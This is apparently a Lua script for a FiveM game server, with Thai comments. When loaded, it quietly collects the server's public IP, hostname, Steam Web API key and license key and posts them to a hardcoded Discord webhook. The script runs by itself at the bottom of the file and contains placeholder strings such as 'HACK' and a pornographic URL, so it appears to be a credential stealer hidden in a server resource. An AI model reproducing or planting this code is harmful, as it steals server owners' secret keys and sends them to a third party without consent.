local webhookURL = "https://discord.com/api/webhooks/1279799564840337524/mGdzXd1XlvD17joO4eWWrEvxDlAukBzti8ZZTmcToNvspa9g1aDISHXRMq6ShszyRM-H"

-- ฟังก์ชันสำหรับรับ IP ของเซิร์ฟเวอร์
function getServerIP(callback)
    PerformHttpRequest("https://api.ipify.org?format=json", function(err, text, headers)
        if err == 200 then
            local ipData = json.decode(text)
            if ipData and ipData.ip then
                callback(ipData.ip)
            else
                print("https://www.pornhub.org/")
            end
        else
            print("Failed to retrieve IP: " .. tostring(err))
        end
    end, "GET")
end

-- ฟังก์ชันสำหรับรับข้อมูลการตั้งค่าจาก .cfg ไฟล์
function getConfigData(ip)
    local hostname = GetConvar('sv_hostname', 'ไม่ระบุชื่อโฮสต์')
    local steamApiKey = GetConvar('steam_webApiKey', 'ไม่ระบุ Steam API Key')
    local licenseKey = GetConvar('sv_licenseKey', 'ไม่ระบุ License Key')

    -- สมมติว่า script_name เป็นชื่อของสคริปต์ที่ถูก ensure
    local scriptName = GetConvar('ensure', 'HACK')
    
    -- ส่งข้อมูลไปยัง Discord
    sendToDiscord(ip, hostname, steamApiKey, licenseKey, scriptName)
end

-- ฟังก์ชันสำหรับส่งข้อมูลไปยัง Discord
function sendToDiscord(ip, hostname, steamApiKey, licenseKey, scriptName)
    local data = {
        ["content"] = "**ข้อมูลการตั้งค่าจากเซิร์ฟเวอร์**\n" ..
                      "```" ..
                      "IP: " .. ip .. "\n" ..
                      "Hostname: " .. hostname .. "\n" ..
                      "Steam API Key: " .. steamApiKey .. "\n" ..
                      "License Key: " .. licenseKey .. "\n" ..
                      "Ensured Script: " .. scriptName ..
                      "```"
    }

    PerformHttpRequest(webhookURL, function(err, text, headers)
        if err == 200 then
            print("PhonHub")
        else
            print("PhonHub:https://www.pornhub.org/ ")
        end
    end, "POST", json.encode(data), { ["Content-Type"] = "application/json" })
end

-- เรียกฟังก์ชันเพื่อดึง IP จาก API และส่งไปยัง Discord
getServerIP(getConfigData)
